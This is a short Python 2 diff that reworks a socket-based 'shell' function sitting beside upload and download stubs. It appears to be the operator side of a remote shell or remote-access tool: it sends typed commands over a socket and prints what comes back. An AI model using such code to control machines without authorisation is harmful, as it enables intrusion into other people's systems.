@@ -59,14 +59,18 @@ def upload(s, caminho_arquivo=False):
 
 def download(s):
     pass
+
 def shell(s):
+    s.send('shell')
     while True:
         try:
-            s.send('shell')
-            executar = raw_input('~> ')
+            executar = raw_input('\33[93m~> \033[0m')
             s.send(executar)
             if(executar == '/exit'):
+                s.send('/exit')
                 break
+            retorno = s.recv(1024)
+            print(retorno)
         except KeyboardInterrupt:
             break
 
